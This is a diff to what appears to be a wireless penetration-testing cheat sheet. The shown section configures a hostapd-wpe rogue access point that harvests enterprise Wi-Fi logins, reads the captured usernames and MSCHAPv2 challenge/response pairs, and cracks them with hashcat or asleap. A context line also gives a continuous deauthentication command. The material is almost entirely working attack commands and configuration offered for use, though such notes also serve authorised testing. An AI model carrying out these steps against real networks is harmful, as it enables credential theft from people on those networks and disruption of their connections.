@@ -62,8 +62,10 @@ sudo aireplay-ng -0 0 -a <REAL_AP_MAC> wlan0mon   # continuous deauth
 Rogue AP that accepts all EAP methods and logs credentials.
 
 ```bash
-# Install
-apt install hostapd-wpe
+# Install: on Kali the `hostapd-wpe` package ships prebuilt; upstream lives at
+# https://github.com/OpenSecurityResearch/hostapd-wpe and is also patched into
+# the aircrack-ng tree (patches/wpe/hostapd-wpe/). No generic Debian/Ubuntu package.
+sudo apt install hostapd-wpe   # Kali / Parrot
 
 # Configure /etc/hostapd-wpe/hostapd-wpe.conf
 interface=wlan1
@@ -80,16 +82,19 @@ dh_file=/etc/hostapd-wpe/certs/dh
 # Start
 sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
 
-# Captured credentials logged to:
-cat /var/log/hostapd-wpe.log
-# Contains: username and MSCHAPv2 exchange data
+# Captured credentials logged to ./hostapd-wpe.log (default; override with
+# wpe_logfile=<path> in hostapd-wpe.conf). File contains:
+#   username, MSCHAPv2 challenge (8 bytes), MSCHAPv2 response (24 bytes).
+cat ./hostapd-wpe.log
 
-# Crack MSCHAPv2 → NTLM hash
-# asleap -C <mschap_chal> -R <mschap_resp> -W rockyou.txt
-# OR extract NT hash from the MSCHAP exchange pair:
-hashcat -m 5600 "username:::<mschap_chal>:<mschap_resp>:" rockyou.txt
+# Crack MSCHAPv2 → NT hash. The 8-byte challenge + 24-byte response pair is
+# cryptographically identical to NetNTLMv1 (three DES blocks over the NT hash),
+# so hashcat mode 5500 is the correct one — not 5600 (which is NetNTLMv2).
+# Format: username::::<response_hex>:<challenge_hex>
+hashcat -m 5500 "username::::<mschap_resp_48hex>:<mschap_chal_16hex>" rockyou.txt
 
-# Or use chapcrack / mschapv2-offline-attack
+# Alternative: asleap directly consumes the challenge/response pair.
+asleap -C <mschap_chal> -R <mschap_resp> -W rockyou.txt
 ```
 
 ---
